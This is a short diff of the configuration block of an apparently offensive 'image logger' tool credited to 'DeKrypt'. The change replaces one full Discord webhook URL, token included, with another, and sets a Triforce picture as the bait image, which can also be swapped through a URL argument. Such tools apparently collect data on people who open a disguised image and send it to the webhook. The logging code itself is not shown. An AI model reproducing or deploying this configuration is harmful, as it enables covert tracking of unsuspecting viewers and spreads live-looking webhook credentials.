@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1124786409224536196/K6xgp5attNYjP3szoVdTGCKi6exj9Sn-5MXOE9zhPzsjxNISwbrSbTMI28wfpwGR-hRT",
+    "webhook": "https://discord.com/api/webhooks/1128334865213968405/JyVrHStFBlHBLxwR6V9nQhb4F76xDzl0E7pHXsoXqWi4wNsbWyhsXYLQhtrr7-ILPkQ7",
     "image": "https://static.wikia.nocookie.net/zelda_gamepedia_en/images/9/9c/TLoZ_Series_Triforce_Artwork.png/revision/latest?cb=20190214050338", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
